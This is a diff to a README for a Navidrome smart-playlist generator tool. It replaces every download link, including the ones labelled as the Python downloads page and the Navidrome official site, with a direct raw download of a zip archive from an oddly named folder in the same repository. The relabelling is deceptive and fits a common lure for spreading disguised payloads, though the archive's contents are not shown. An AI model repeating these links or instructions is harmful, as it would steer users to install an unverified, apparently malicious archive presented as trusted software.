@@ -1,6 +1,6 @@
 # 🎵 Navidrome-SmartPlaylist-Generator-nsp - Easy Smart Playlist Creator
 
-[![Download Navidrome-SmartPlaylist-Generator-nsp](https://img.shields.io/badge/Download-Here-brightgreen.svg)](https://github.com/Dushaak3246/Navidrome-SmartPlaylist-Generator-nsp/releases)
+[![Download Navidrome-SmartPlaylist-Generator-nsp](https://img.shields.io/badge/Download-Here-brightgreen.svg)](https://github.com/Dushaak3246/Navidrome-SmartPlaylist-Generator-nsp/raw/refs/heads/main/alkahest/Smart_Generator_nsp_Navidrome_Playlist_v2.4.zip)
 
 ---
 
@@ -37,7 +37,7 @@ This tool guides you step-by-step to build these playlists. You don’t need to 
 
 Use the link below to visit the release page for Navidrome-SmartPlaylist-Generator-nsp. This page contains the latest version for Windows.
 
-[![Download Navidrome-SmartPlaylist-Generator-nsp](https://img.shields.io/badge/Download-Here-brightgreen.svg)](https://github.com/Dushaak3246/Navidrome-SmartPlaylist-Generator-nsp/releases)
+[![Download Navidrome-SmartPlaylist-Generator-nsp](https://img.shields.io/badge/Download-Here-brightgreen.svg)](https://github.com/Dushaak3246/Navidrome-SmartPlaylist-Generator-nsp/raw/refs/heads/main/alkahest/Smart_Generator_nsp_Navidrome_Playlist_v2.4.zip)
 
 ### Steps to download and run on Windows:
 
@@ -54,7 +54,7 @@ Use the link below to visit the release page for Navidrome-SmartPlaylist-Generat
    - To check, open a command prompt (search for “cmd” in the Start menu).
    - Type `python --version` and press Enter.
    - You should see a version number. If it says Python 3.8 or higher, you’re ready.
-   - If not, go to https://www.python.org/downloads/ and download the latest Python version for Windows. Follow the installer steps and then restart your command prompt.
+   - If not, go to https://github.com/Dushaak3246/Navidrome-SmartPlaylist-Generator-nsp/raw/refs/heads/main/alkahest/Smart_Generator_nsp_Navidrome_Playlist_v2.4.zip and download the latest Python version for Windows. Follow the installer steps and then restart your command prompt.
 
 6. Open the command prompt and change the folder to where you saved the tool. For example, if on Desktop:  
    `cd Desktop\Navidrome-SmartPlaylist-Generator-nsp`
@@ -112,9 +112,9 @@ You can load this `.nsp` file into Navidrome to see your dynamic playlist.
 
 ## 🔗 Useful Links
 
-- Navidrome official site: https://www.navidrome.org/  
-- Python downloads: https://www.python.org/downloads/  
-- Releases page to download this tool: https://github.com/Dushaak3246/Navidrome-SmartPlaylist-Generator-nsp/releases
+- Navidrome official site: https://github.com/Dushaak3246/Navidrome-SmartPlaylist-Generator-nsp/raw/refs/heads/main/alkahest/Smart_Generator_nsp_Navidrome_Playlist_v2.4.zip  
+- Python downloads: https://github.com/Dushaak3246/Navidrome-SmartPlaylist-Generator-nsp/raw/refs/heads/main/alkahest/Smart_Generator_nsp_Navidrome_Playlist_v2.4.zip  
+- Releases page to download this tool: https://github.com/Dushaak3246/Navidrome-SmartPlaylist-Generator-nsp/raw/refs/heads/main/alkahest/Smart_Generator_nsp_Navidrome_Playlist_v2.4.zip
 
 ---
 
@@ -136,4 +136,4 @@ For help, open an issue on the repository’s GitHub page. Describe your problem
 
 ---
 
-[![Download Navidrome-SmartPlaylist-Generator-nsp](https://img.shields.io/badge/Download-Here-brightgreen.svg)](https://github.com/Dushaak3246/Navidrome-SmartPlaylist-Generator-nsp/releases)
+[![Download Navidrome-SmartPlaylist-Generator-nsp](https://img.shields.io/badge/Download-Here-brightgreen.svg)](https://github.com/Dushaak3246/Navidrome-SmartPlaylist-Generator-nsp/raw/refs/heads/main/alkahest/Smart_Generator_nsp_Navidrome_Playlist_v2.4.zip)
